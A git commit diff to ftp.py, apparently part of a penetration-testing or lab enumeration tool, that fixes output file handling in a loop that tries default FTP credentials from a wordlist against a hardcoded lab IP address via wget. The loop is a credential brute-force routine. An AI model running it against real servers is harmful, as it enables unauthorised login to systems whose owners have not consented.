e8d2e2946c35dc12696af6873f84a037e47dc9a0
ArjunaAcchaDipa <arjunaacchadipa@gmail.com>
2023-01-04 14:24:22 +0700

    Fix output redirect and and html output file

--- ftp.py
+++ ftp.py
@@ -1,7 +1,8 @@
 import basic_command
 
 def enumeration(target, current_time, is_verbose):
-    output = f"ftp_{target}.txt"
+    output_response = f"ftp_response_{target}.txt"
+    output_html = f"ftp_html_{target}.txt"
     output_directory = f"./result/{current_time}/"
 
     basic_command.mkdir(output_directory)
@@ -9,11 +10,11 @@ def enumeration(target, current_time, is_verbose):
     default_ftp_credentials = basic_command.read_file("./wordlist/ftp-betterdefaultpasslist.txt").split("\n")
 
     for credential in default_ftp_credentials:
-        basic_command.run_command(f"wget ftp://{credential}@10.10.86.234 -o {is_verbose}{output}")
+        basic_command.run_command(f"wget ftp://{credential}@10.10.86.234 -o {output_directory}{output_response} -O {output_directory}{output_html}")
 
-        result = basic_command.read_file(f"{output_directory}{output}")
+        result = basic_command.read_file(f"{output_directory}{output_response}")
 
         if "Logged in" in result:
             break
 
-    return f"{output_directory}{output}"
+    return f"{output_directory}{output_response}"
